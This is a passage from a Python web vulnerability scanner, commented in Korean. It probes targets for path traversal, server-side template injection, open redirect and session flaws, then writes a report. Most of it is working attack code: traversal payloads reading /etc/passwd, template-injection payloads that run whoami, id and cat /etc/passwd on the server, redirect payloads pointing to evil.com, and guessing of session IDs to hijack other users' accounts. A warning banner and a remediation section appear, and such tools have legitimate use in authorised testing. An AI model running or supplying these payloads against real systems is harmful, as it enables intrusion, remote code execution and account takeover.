            print(f"\n{Fore.RED}[!] Found {len(found_xxe)} XXE vulnerabilities!{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}[-] No XXE vulnerabilities found.{Style.RESET_ALL}")

    def test_path_traversal(self):
        """Path Traversal 테스트"""
        print(f"\n{Fore.CYAN}[*] Testing Path Traversal vulnerabilities...{Style.RESET_ALL}")
        
        # Path Traversal 엔드포인트
        endpoints = [
            ('download.php', 'file'),
            ('read.php', 'path'),
            ('view.php', 'page'),
            ('load.php', 'doc'),
            ('get.php', 'filename'),
            ('display.php', 'template'),
            ('include.php', 'page'),
            ('show.php', 'file'),
            ('export.php', 'report'),
            ('backup.php', 'name'),
        ]
        
        # Path Traversal 페이로드
        traversal_payloads = [
            # 기본
            ('../../../etc/passwd', 'basic'),
            ('../../../../../../etc/passwd', 'deep'),
            ('..\..\..\windows\win.ini', 'windows'),
            
            # 인코딩
            ('..%2f..%2f..%2fetc%2fpasswd', 'url_encoded'),
            ('..%252f..%252f..%252fetc%252fpasswd', 'double_encoded'),
            ('%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'full_encoded'),
            
            # 바이패스
            ('....//....//....//etc/passwd', 'double_dots'),
            ('....//../...//../etc/passwd', 'mixed'),
            ('..\../..\../etc/passwd', 'mixed_slash'),
            
            # 절대 경로
            ('/etc/passwd', 'absolute'),
            ('C:\\Windows\\win.ini', 'absolute_win'),
            ('\\\\server\\share\\file', 'unc_path'),
        ]
        
        found_traversal = []
        
        for endpoint, param in endpoints:
            url = urljoin(self.target_url, endpoint)
            
            # 엔드포인트 확인
            try:
                test_response = self.session.get(f"{url}?{param}=test.txt", timeout=3)
                if test_response.status_code != 200:
                    continue
                    
                print(f"\n{Fore.YELLOW}[*] Testing {endpoint} (parameter: {param})...{Style.RESET_ALL}")
                
            except:
                continue
            
            for payload, technique in traversal_payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=5)
                    
                    if response.status_code == 200:
                        # Linux 시스템 파일
                        if any(indicator in response.text for indicator in ['root:', 'bin:', 'daemon:', '/bin/bash']):
                            print(f"{Fore.RED}[+] Path Traversal found! ({technique}){Style.RESET_ALL}")
                            print(f"    Payload: {payload}")
                            print(f"    Content: {response.text[:150]}...")
                            
                            found_traversal.append({
                                'endpoint': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'technique': technique,
                                'type': 'Linux System File'
                            })
                            break
                        
                        # Windows 시스템 파일
                        elif '[fonts]' in response.text or 'for 16-bit app support' in response.text:
                            print(f"{Fore.RED}[+] Windows Path Traversal found!{Style.RESET_ALL}")
                            print(f"    Payload: {payload}")
                            
                            found_traversal.append({
                                'endpoint': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'technique': technique,
                                'type': 'Windows System File'
                            })
                            break
                
                except Exception as e:
                    pass
                
                time.sleep(0.3)
        
        if found_traversal:
            self.vulnerabilities.extend([{
                'type': 'Path Traversal',
                'details': vuln
            } for vuln in found_traversal])
            
            print(f"\n{Fore.RED}[!] Found {len(found_traversal)} Path Traversal vulnerabilities!{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}[-] No Path Traversal vulnerabilities found.{Style.RESET_ALL}")
    
    def test_ssti(self):
        """Server-Side Template Injection 테스트"""
        print(f"\n{Fore.CYAN}[*] Testing Server-Side Template Injection (SSTI)...{Style.RESET_ALL}")
        
        # SSTI 테스트 엔드포인트
        endpoints = [
            ('search.php', 'q'),
            ('template.php', 'name'),
            ('render.php', 'template'),
            ('preview.php', 'content'),
            ('mail.php', 'body'),
            ('message.php', 'text'),
            ('greeting.php', 'name'),
            ('profile.php', 'bio'),
            ('comment.php', 'text'),
        ]
        
        # SSTI 페이로드 (다양한 템플릿 엔진)
        ssti_payloads = [
            # 기본 수학 연산
            ('{{7*7}}', 'basic_jinja', '49'),
            ('${7*7}', 'basic_freemarker', '49'),
            ('{{7*\'7\'}}', 'string_multiply', '7777777'),
            ('<%= 7*7 %>', 'erb', '49'),
            
            # Jinja2/Flask
            ('{{config}}', 'jinja_config', 'SECRET_KEY'),
            ('{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}', 'jinja_rce', 'uid='),
            
            # Twig
            ('{{7*\'7\'}}', 'twig_test', '49'),
            ('{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}', 'twig_rce', 'uid='),
            
            # Smarty
            ('{$smarty.version}', 'smarty_version', 'Smarty'),
            ('{system(\'id\')}', 'smarty_rce', 'uid='),
            
            # Expression Language
            ('${T(java.lang.Runtime).getRuntime().exec(\'id\')}', 'spel_rce', 'uid='),
            
            # Velocity
            ('#set($$x=7*7)$$x', 'velocity', '49'),
        ]
        
        found_ssti = []
        
        for endpoint, param in endpoints:
            url = urljoin(self.target_url, endpoint)
            
            print(f"\n{Fore.YELLOW}[*] Testing {endpoint} (parameter: {param})...{Style.RESET_ALL}")
            
            for payload, engine, expected in ssti_payloads:
                try:
                    # GET 테스트
                    test_url = f"{url}?{param}={quote(payload)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    # SSTI 확인
                    if expected in response.text:
                        print(f"{Fore.RED}[+] SSTI found! Engine: {engine}{Style.RESET_ALL}")
                        print(f"    Payload: {payload}")
                        print(f"    Expected: {expected} - Found!")
                        
                        found_ssti.append({
                            'endpoint': endpoint,
                            'parameter': param,
                            'method': 'GET',
                            'payload': payload,
                            'engine': engine
                        })
                        
                        # RCE 시도
                        if engine.endswith('_rce'):
                            self.exploit_ssti_rce(url, param, engine)
                        break
                    
                    # POST 테스트
                    post_data = {param: payload}
                    post_response = self.session.post(url, data=post_data, timeout=5)
                    
                    if expected in post_response.text:
                        print(f"{Fore.RED}[+] SSTI found via POST! Engine: {engine}{Style.RESET_ALL}")
                        
                        found_ssti.append({
                            'endpoint': endpoint,
                            'parameter': param,
                            'method': 'POST',
                            'payload': payload,
                            'engine': engine
                        })
                        break
                
                except Exception as e:
                    pass
                
                time.sleep(0.3)
        
        if found_ssti:
            self.vulnerabilities.extend([{
                'type': 'SSTI',
                'details': vuln
            } for vuln in found_ssti])
            
            print(f"\n{Fore.RED}[!] Found {len(found_ssti)} SSTI vulnerabilities!{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}[-] No SSTI vulnerabilities found.{Style.RESET_ALL}")
    
    def exploit_ssti_rce(self, url, param, engine):
        """SSTI RCE 악용"""
        print(f"\n{Fore.YELLOW}[*] Attempting RCE via SSTI ({engine})...{Style.RESET_ALL}")
        
        rce_commands = {
            'jinja_rce': [
                "{{request.__class__.__mro__[0].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            ],
            'smarty_rce': [
                "{system('whoami')}",
                "{passthru('id')}",
            ],
            'twig_rce': [
                "{{['id']|filter('system')}}",
                "{{['cat /etc/passwd']|filter('system')}}",
            ]
        }
        
        if engine in rce_commands:
            for cmd in rce_commands[engine]:
                try:
                    test_url = f"{url}?{param}={quote(cmd)}"
                    response = self.session.get(test_url, timeout=5)
                    
                    if any(indicator in response.text for indicator in ['root', 'www-data', 'uid=', 'gid=']):
                        print(f"{Fore.RED}[+] RCE Successful!{Style.RESET_ALL}")
                        print(f"    Output: {response.text[:200]}...")
                        break
                except:
                    pass
    
    def test_open_redirect(self):
        """Open Redirect 테스트"""
        print(f"\n{Fore.CYAN}[*] Testing Open Redirect vulnerabilities...{Style.RESET_ALL}")
        
        # Open Redirect 엔드포인트
        endpoints = [
            ('redirect.php', 'url'),
            ('go.php', 'to'),
            ('out.php', 'target'),
            ('login.php', 'next'),
            ('logout.php', 'return'),
            ('redir.php', 'url'),
            ('return.php', 'url'),
            ('continue.php', 'next'),
            ('goto.php', 'url'),
            ('away.php', 'to'),
        ]
        
        # Redirect 페이로드
        redirect_payloads = [
            # 기본
            ('http://evil.com', 'basic_http'),
            ('https://evil.com', 'basic_https'),
            ('//evil.com', 'protocol_relative'),
            
            # 바이패스
            ('http://evil.com@trusted.com', 'at_bypass'),
            ('http://trusted.com.evil.com', 'subdomain'),
            ('http://trusted.com%2f@evil.com', 'encoded_slash'),
            ('http://evil.com#trusted.com', 'fragment'),
            ('http://evil.com?trusted.com', 'query'),
            
            # 특수 프로토콜
            ('javascript:alert(1)', 'javascript'),
            ('data:text/html,<script>alert(1)</script>', 'data_uri'),
            
            # 인코딩
            ('http%3A%2F%2Fevil.com', 'url_encoded'),
            ('http://evil%2Ecom', 'dot_encoded'),
            
            # 경로 기반
            ('../../../http://evil.com', 'path_traversal'),
            ('////evil.com', 'multiple_slashes'),
        ]
        
        found_redirects = []
        
        for endpoint, param in endpoints:
            url = urljoin(self.target_url, endpoint)
            
            # 엔드포인트 확인
            try:
                test_response = self.session.get(url, allow_redirects=False, timeout=3)
                if test_response.status_code not in [200, 302, 301, 303, 307]:
                    continue
                    
                print(f"\n{Fore.YELLOW}[*] Testing {endpoint} (parameter: {param})...{Style.RESET_ALL}")
                
            except:
                continue
            
            for payload, technique in redirect_payloads:
                try:
                    test_url = f"{url}?{param}={quote(payload)}"
                    response = self.session.get(test_url, allow_redirects=False, timeout=5)
                    
                    # Redirect 확인
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        
                        # 악성 URL로 리다이렉트 확인
                        if any(evil in location.lower() for evil in ['evil.com', 'javascript:', 'data:']):
                            print(f"{Fore.RED}[+] Open Redirect found! ({technique}){Style.RESET_ALL}")
                            print(f"    Payload: {payload}")
                            print(f"    Redirects to: {location}")
                            
                            found_redirects.append({
                                'endpoint': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'technique': technique,
                                'redirect_to': location
                            })
                    
                    # Meta refresh 확인
                    elif '<meta' in response.text.lower() and 'refresh' in response.text.lower():
                        if any(evil in response.text.lower() for evil in ['evil.com', 'javascript:', 'data:']):
                            print(f"{Fore.RED}[+] Meta refresh redirect found!{Style.RESET_ALL}")
                            print(f"    Payload: {payload}")
                            
                            found_redirects.append({
                                'endpoint': endpoint,
                                'parameter': param,
                                'payload': payload,
                                'technique': 'meta_refresh',
                                'type': 'Meta Refresh'
                            })
                
                except Exception as e:
                    pass
                
                time.sleep(0.3)

        if found_redirects:
            self.vulnerabilities.extend([{
                'type': 'Open Redirect',
                'details': vuln
            } for vuln in found_redirects])
            
            print(f"\n{Fore.RED}[!] Found {len(found_redirects)} Open Redirect vulnerabilities!{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}[-] No Open Redirect vulnerabilities found.{Style.RESET_ALL}")
    
    def test_session_cookie(self):
        """Session/Cookie 취약점 테스트"""
        print(f"\n{Fore.CYAN}[*] Testing Session and Cookie vulnerabilities...{Style.RESET_ALL}")
        
        found_issues = []
        
        # 1. 다른 사용자의 세션 예측/추측 테스트
        print(f"\n{Fore.YELLOW}[*] Testing Session ID Prediction...{Style.RESET_ALL}")
        
        current_session = self.session.cookies.get('PHPSESSID', '')
        if current_session:
            print(f"Current session: {current_session[:20]}...")
            
            # 세션 ID 패턴 분석
            if len(current_session) < 20:
                print(f"{Fore.RED}[!] Short session ID - easier to brute force{Style.RESET_ALL}")
                found_issues.append({
                    'type': 'Weak Session ID',
                    'description': 'Session ID too short'
                })
            
            # 다른 세션 ID로 접근 시도
            print(f"\n{Fore.YELLOW}[*] Trying to access with modified session IDs...{Style.RESET_ALL}")
            
            # 현재 세션 ID를 기반으로 변형
            test_sessions = []
            
            # 숫자 부분만 변경
            if current_session[-1].isdigit():
                for i in range(5):
                    new_session = current_session[:-1] + str((int(current_session[-1]) + i) % 10)
                    test_sessions.append(new_session)
            
            # 순차적인 세션 ID 테스트
            base = current_session[:-4]
            for i in range(10):
                test_sessions.append(base + f"{i:04d}")
            
            # 테스트
            for test_session in test_sessions[:10]:  # 처음 10개만
                test_session_obj = requests.Session()
                test_session_obj.cookies.set('PHPSESSID', test_session)
                
                try:
                    # 프로필 페이지 접근 시도
                    profile_url = urljoin(self.target_url, 'profile.php')
                    response = test_session_obj.get(profile_url, timeout=3)
                    
                    # 다른 사용자로 로그인된 경우
                    if response.status_code == 200 and 'logout' in response.text.lower():
                        # 현재 사용자와 다른 사용자인지 확인
                        if self.username and self.username not in response.text:
                            print(f"{Fore.RED}[!] CRITICAL: Accessed another user's session!{Style.RESET_ALL}")
                            print(f"    Session ID: {test_session}")
                            
                            # 사용자 정보 추출 시도
                            username_match = re.search(r'Welcome,?\s*(\w+)', response.text, re.IGNORECASE)
                            if username_match:
                                print(f"    Logged in as: {username_match.group(1)}")
                            
                            found_issues.append({
                                'type': 'Session Hijacking',
                                'description': 'Predictable session ID allowed access to another user',
                                'session': test_session
                            })
                            break
                            
                except:
                    pass
                
                time.sleep(0.5)
        
        # 2. 세션 고정 공격 테스트 (다른 방식)
        print(f"\n{Fore.YELLOW}[*] Testing Session Fixation (attacker perspective)...{Style.RESET_ALL}")
        
        # 공격자가 세션 ID를 미리 설정
        fixed_session_id = "attacker_fixed_session_12345"
        
        # 새로운 세션으로 로그인 페이지 접근
        attacker_session = requests.Session()
        attacker_session.cookies.set('PHPSESSID', fixed_session_id)
        
        login_url = urljoin(self.target_url, 'login.php')
        
        # 이 세션 ID로 로그인 시도
        login_data = {
            'username': 'test_user',
            'password': 'wrong_password'
        }
        
        response = attacker_session.post(login_url, data=login_data)
        
        # 로그인 실패 후에도 같은 세션 ID를 유지하는지 확인
        if attacker_session.cookies.get('PHPSESSID') == fixed_session_id:
            print(f"{Fore.YELLOW}[!] Server accepts client-provided session ID{Style.RESET_ALL}")
            print(f"    This could lead to session fixation attacks")
            found_issues.append({
                'type': 'Session Fixation Risk',
                'description': 'Server accepts arbitrary session IDs from client'
            })
        
        # 3. 쿠키 속성 분석 (보안 관점)
        print(f"\n{Fore.YELLOW}[*] Analyzing cookie security attributes...{Style.RESET_ALL}")
        
        for cookie in self.session.cookies:
            issues = []
            
            # HTTPS가 아닌데 Secure 플래그가 없음
            if 'https' not in self.target_url and not cookie.secure:
                issues.append(f"Cookie '{cookie.name}' transmitted over HTTP without Secure flag")
            
            # 세션 쿠키인데 HttpOnly가 없음
            if 'session' in cookie.name.lower() and not cookie.has_nonstandard_attr('HttpOnly'):
                issues.append(f"Session cookie '{cookie.name}' vulnerable to XSS (no HttpOnly)")
                
            # SameSite 속성 없음
            if not cookie.get_nonstandard_attr('SameSite'):
                issues.append(f"Cookie '{cookie.name}' vulnerable to CSRF (no SameSite)")
            
            if issues:
                for issue in issues:
                    print(f"{Fore.RED}[!] {issue}{Style.RESET_ALL}")
                    found_issues.append({
                        'type': 'Insecure Cookie',
                        'description': issue
                    })
        
        # 4. 세션 데이터 노출 테스트
        print(f"\n{Fore.YELLOW}[*] Testing for session data exposure...{Style.RESET_ALL}")
        
        # 일반적인 세션 파일 경로
        session_paths = [
            f'temp/sess_{current_session}',
            f'tmp/sess_{current_session}',
            f'var/sessions/sess_{current_session}',
            f'sessions/sess_{current_session}',
        ]
        
        for path in session_paths:
            try:
                url = urljoin(self.target_url, path)
                response = self.session.get(url, timeout=3)
                
                if response.status_code == 200 and len(response.text) > 0:
                    print(f"{Fore.RED}[!] Session file exposed at: {path}{Style.RESET_ALL}")
                    print(f"    Content: {response.text[:100]}...")
                    found_issues.append({
                        'type': 'Session File Exposure',
                        'path': path,
                        'description': 'Session data publicly accessible'
                    })
                    
            except:
                pass
        
        # 5. 로그아웃 후 세션 유효성 테스트
        print(f"\n{Fore.YELLOW}[*] Testing session invalidation after logout...{Style.RESET_ALL}")
        
        # 현재 세션 정보 저장
        old_session = self.session.cookies.get('PHPSESSID', '')
        
        # 로그아웃
        logout_url = urljoin(self.target_url, 'logout.php')
        self.session.get(logout_url)
        
        # 이전 세션으로 다시 접근 시도
        test_session = requests.Session()
        test_session.cookies.set('PHPSESSID', old_session)
        
        profile_response = test_session.get(urljoin(self.target_url, 'profile.php'))
        
        if profile_response.status_code == 200 and 'logout' in profile_response.text.lower():
            print(f"{Fore.RED}[!] Session not properly invalidated after logout!{Style.RESET_ALL}")
            found_issues.append({
                'type': 'Session Management',
                'description': 'Session remains valid after logout'
            })
        
        # 6. 동시 세션 테스트
        print(f"\n{Fore.YELLOW}[*] Testing concurrent sessions...{Style.RESET_ALL}")
        
        # 같은 계정으로 다른 세션 생성
        new_session = requests.Session()
        login_data = {
            'username': self.username,
            'password': self.password
        }
        
        new_login_response = new_session.post(login_url, data=login_data)
        
        if 'logout' in new_login_response.text.lower():
            # 이전 세션이 여전히 유효한지 확인
            old_session_response = self.session.get(urljoin(self.target_url, 'profile.php'))
            
            if 'logout' in old_session_response.text.lower():
                print(f"{Fore.YELLOW}[!] Multiple concurrent sessions allowed{Style.RESET_ALL}")
                print(f"    This might be a security risk in sensitive applications")
        
        # 결과 저장
        if found_issues:
            self.vulnerabilities.extend([{
                'type': 'Session/Cookie',
                'details': issue
            } for issue in found_issues])
            
            print(f"\n{Fore.RED}[!] Found {len(found_issues)} Session/Cookie security issues!{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}[-] No critical Session/Cookie vulnerabilities found.{Style.RESET_ALL}")
    
    def check_session_randomness(self, session_id):
        """세션 ID의 무작위성 확인"""
        # 간단한 엔트로피 체크
        if len(session_id) < 20:
            return True  # 너무 짧음
        
        # 반복 패턴 확인
        if len(set(session_id)) < len(session_id) * 0.5:
            return True  # 중복 문자가 너무 많음
        
        # 순차적 패턴 확인
        if any(pattern in session_id.lower() for pattern in ['12345', 'abcde', '00000']):
            return True
        
        return False
    
    def is_jwt(self, token):
        """JWT 토큰인지 확인"""
        parts = token.split('.')
        if len(parts) != 3:
            return False
        
        try:
            # JWT는 base64 인코딩되어 있음
            for part in parts[:2]:
                base64.b64decode(part + '==')
            return True
        except:
            return False
    
    def analyze_jwt(self, token):
        """JWT 토큰 분석"""
        parts = token.split('.')
        
        try:
            # 헤더 디코딩
            header = json.loads(base64.b64decode(parts[0] + '=='))
            print(f"  Header: {header}")
            
            # 페이로드 디코딩
            payload = json.loads(base64.b64decode(parts[1] + '=='))
            print(f"  Payload: {payload}")
            
            # 취약점 확인
            if header.get('alg') == 'none':
                print(f"{Fore.RED}  [!] JWT with 'none' algorithm - signature not required!{Style.RESET_ALL}")
            
            if header.get('alg') in ['HS256', 'HS384', 'HS512']:
                print(f"{Fore.YELLOW}  [!] JWT with symmetric algorithm - try brute forcing secret{Style.RESET_ALL}")
            
            # 만료 시간 확인
            if 'exp' in payload:
                exp_time = datetime.fromtimestamp(payload['exp'])
                if exp_time > datetime.now():
                    print(f"  Expires: {exp_time}")
                else:
                    print(f"{Fore.YELLOW}  [!] Token expired at: {exp_time}{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"  Error decoding JWT: {e}")
    
    def run_all_tests(self):
        """모든 테스트 실행"""
        print(f"\n{Fore.CYAN}[*] Running all vulnerability tests...{Style.RESET_ALL}")
        
        tests = [
            self.test_command_injection,
            self.test_ssrf,
            self.test_lfi,
            self.test_file_upload,
            self.test_idor,
            self.test_xxe,
            self.test_path_traversal,
            self.test_ssti,
            self.test_open_redirect,
            self.test_session_cookie,
        ]
        
        for test in tests:
            try:
                test()
            except Exception as e:
                print(f"{Fore.RED}[-] Error in {test.__name__}: {e}{Style.RESET_ALL}")
            
            time.sleep(2)
    
    def generate_report(self):
        """취약점 리포트 생성"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        filename = f"vulnerability_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        report_content = f"""
╔══════════════════════════════════════════════════════════════╗
║           Web Vulnerability Assessment Report                ║
╚══════════════════════════════════════════════════════════════╝

Target: {self.target_url}
Date: {timestamp}
Tester: {self.username if self.username else 'Anonymous'}

════════════════════════════════════════════════════════════════
EXECUTIVE SUMMARY
════════════════════════════════════════════════════════════════

Total Vulnerabilities Found: {len(self.vulnerabilities)}

Breakdown by Type:
"""
        
        # 취약점 타입별 집계
        vuln_types = {}
        for vuln in self.vulnerabilities:
            vuln_type = vuln['type']
            if vuln_type not in vuln_types:
                vuln_types[vuln_type] = 0
            vuln_types[vuln_type] += 1
        
        for vuln_type, count in vuln_types.items():
            report_content += f"  - {vuln_type}: {count}\n"
        
        report_content += """
════════════════════════════════════════════════════════════════
DETAILED FINDINGS
════════════════════════════════════════════════════════════════
"""
        
        # 취약점별 상세 내용
        for i, vuln in enumerate(self.vulnerabilities, 1):
            report_content += f"""
[{i}] {vuln['type']}
{'─' * 60}
"""
            if 'details' in vuln:
                details = vuln['details']
                for key, value in details.items():
                    report_content += f"  {key}: {value}\n"
            else:
                for key, value in vuln.items():
                    if key != 'type':
                        report_content += f"  {key}: {value}\n"
            
            report_content += "\n"
        
        # 권장사항 추가
        report_content += """
════════════════════════════════════════════════════════════════
RECOMMENDATIONS
════════════════════════════════════════════════════════════════

1. Command Injection:
   - Use parameterized commands or avoid system calls
   - Implement strict input validation
   - Use whitelisting for allowed characters

2. SSRF:
   - Validate and whitelist allowed URLs
   - Disable unnecessary protocols
   - Implement network segmentation

3. LFI/RFI:
   - Avoid user input in file operations
   - Use whitelisting for allowed files
   - Disable dangerous PHP wrappers

4. File Upload:
   - Validate file types and extensions
   - Store files outside web root
   - Generate random filenames

5. IDOR:
   - Implement proper access controls
   - Use indirect object references
   - Verify user permissions for each request

6. XXE:
   - Disable external entity processing
   - Use less complex data formats (JSON)
   - Validate XML against a schema

════════════════════════════════════════════════════════════════
"""
        
        # 리포트 저장
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(report_content)
        
        print(f"\n{Fore.GREEN}[+] Report saved to: {filename}{Style.RESET_ALL}")
        
        # 간단한 요약 출력
        print(f"\n{Fore.CYAN}Summary:{Style.RESET_ALL}")
        print(f"Total vulnerabilities: {len(self.vulnerabilities)}")
        for vuln_type, count in vuln_types.items():
            severity = self.get_severity(vuln_type)
            color = Fore.RED if severity == 'HIGH' else Fore.YELLOW
            print(f"{color}  - {vuln_type}: {count} [{severity}]{Style.RESET_ALL}")
    
    def get_severity(self, vuln_type):
        """취약점 심각도 판단"""
        high_severity = ['Command Injection', 'SSRF', 'XXE', 'File Upload']
        medium_severity = ['LFI', 'IDOR']
        
        if vuln_type in high_severity:
            return 'HIGH'
        elif vuln_type in medium_severity:
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def show_help(self):
        """도움말 표시"""
        help_text = f"""
{Fore.CYAN}=== Web Vulnerability Testing Tool Help ==={Style.RESET_ALL}

{Fore.YELLOW}Command Injection:{Style.RESET_ALL}
  Tests for OS command execution vulnerabilities
  Payloads: ; | && || ` $() and more

{Fore.YELLOW}SSRF (Server-Side Request Forgery):{Style.RESET_ALL}
  Tests if server can be forced to make requests
  Targets: AWS metadata, internal services, files

{Fore.YELLOW}LFI/RFI:{Style.RESET_ALL}
  Local/Remote File Inclusion vulnerabilities
  Can read sensitive files or execute remote code

{Fore.YELLOW}File Upload:{Style.RESET_ALL}
  Tests for unrestricted file upload
  Attempts: PHP shells, .htaccess, double extensions

{Fore.YELLOW}IDOR:{Style.RESET_ALL}
  Insecure Direct Object Reference
  Access other users' data by changing IDs

{Fore.YELLOW}XXE:{Style.RESET_ALL}
  XML External Entity injection
  Can read files or perform SSRF via XML

{Fore.YELLOW}Tips:{Style.RESET_ALL}
  - Always get permission before testing
  - Start with less intrusive tests
  - Document all findings
  - Test in non-production environment
"""
        print(help_text)
    
    def run(self):
        """메인 실행 루프"""
        # 타겟 설정
        if not self.get_target():
            print(f"{Fore.RED}[-] Failed to set target. Exiting...{Style.RESET_ALL}")
            return
        
        # 로그인
        print(f"\n{Fore.YELLOW}[*] Login required to access all features{Style.RESET_ALL}")
        if not self.login():
            continue_anyway = input(f"\n{Fore.YELLOW}Continue without login? Some tests may fail (y/n): {Style.RESET_ALL}")
            if continue_anyway.lower() != 'y':
                return
        
        # 메인 루프
        while True:
            self.print_banner()
            self.show_menu()
            
            choice = input(f"\n{Fore.GREEN}Select an option: {Style.RESET_ALL}").strip().upper()
            
            if choice == '1':
                self.test_command_injection()
            elif choice == '2':
                self.test_ssrf()
            elif choice == '3':
                self.test_lfi()
            elif choice == '4':
                self.test_file_upload()
            elif choice == '5':
                self.test_idor()
            elif choice == '6':
                self.test_xxe()
            elif choice == '7':
                self.test_path_traversal()
            elif choice == '8':
                self.test_ssti()
            elif choice == '9':
                self.test_open_redirect()
            elif choice == '10':
                self.test_session_cookie()
            elif choice == 'A':
                self.run_all_tests()
            elif choice == 'R':
                if self.vulnerabilities:
                    self.generate_report()
                else:
                    print(f"{Fore.YELLOW}[!] No vulnerabilities found yet. Run some tests first!{Style.RESET_ALL}")
            elif choice == 'L':
                self.login()
            elif choice == 'H':
                self.show_help()
            elif choice == 'Q':
                print(f"\n{Fore.YELLOW}[*] Exiting...{Style.RESET_ALL}")
                break
            else:
                print(f"{Fore.RED}[-] Invalid option!{Style.RESET_ALL}")
            
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            os.system('clear' if os.name == 'posix' else 'cls')


def main():
    """메인 함수"""
    print(f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════╗
║                     W A R N I N G                            ║
║                                                              ║
║  This tool is for educational and authorized testing only!   ║
║  Unauthorized access to computer systems is illegal.         ║
║  Always get written permission before testing.               ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
""")
    
    input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # 도구 실행
    tester = WebVulnerabilityTester()
    
    try:
        tester.run()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Unexpected error: {e}{Style.RESET_ALL}")
        sys.exit(1)


if __name__ == "__main__":
    main()